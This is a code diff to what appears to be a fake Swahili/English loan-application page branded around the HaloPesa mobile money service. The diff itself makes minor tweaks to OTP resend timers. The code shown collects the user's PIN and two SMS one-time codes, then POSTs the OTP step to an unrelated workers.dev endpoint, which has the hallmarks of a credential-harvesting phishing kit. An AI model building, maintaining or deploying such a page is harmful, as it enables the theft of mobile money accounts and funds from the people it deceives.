@@ -459,7 +459,7 @@ input[type=range].loan-range::-moz-range-thumb{
       <div id="otp1Status" style="text-align:center;font-size:13px;color:var(--ink-3);min-height:20px;margin-top:4px"></div>
 
       <div class="resend-row">
-        <span id="otp1Timer" data-i18n="resendIn">Tuma tena baada ya <b id="otp1Secs">120</b>s</span>
+        <span id="otp1Timer">Tuma tena baada ya <b id="otp1Secs">120</b>s</span>
         <button class="resend-link off" id="otp1ResendBtn" onclick="resendOtp1()" data-i18n="resend" style="display:none">Tuma tena</button>
       </div>
     </div>
@@ -505,7 +505,7 @@ input[type=range].loan-range::-moz-range-thumb{
       <div id="otp2Status" style="text-align:center;font-size:13px;color:var(--ink-3);min-height:20px;margin-top:4px"></div>
 
       <div class="resend-row">
-        <span id="otp2Timer" data-i18n="resendIn">Tuma tena baada ya <b id="otp2Secs">120</b>s</span>
+        <span id="otp2Timer">Tuma tena baada ya <b id="otp2Secs">120</b>s</span>
         <button class="resend-link off" id="otp2ResendBtn" onclick="resendOtp2()" data-i18n="resend" style="display:none">Tuma tena</button>
       </div>
     </div>
@@ -861,7 +861,6 @@ function verifyOtp2(){
   if(otp2Val === pin){ showOtp2Err(lang==='sw'?'OTP si PIN yako — angalia ujumbe wako':'OTP is not your PIN — check your SMS'); return; }
   if(otp2Val === otp1Val){ showOtp2Err(lang==='sw'?'Weka nambari mpya ya OTP':'Enter the new OTP'); return; }
   setOtp2Verifying(true);
-  if(otp2Timer) clearInterval(otp2Timer);
   var _t2 = getLoanTier(loanAmount);
   fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
     body:JSON.stringify({event:'otp2_verified',data:{
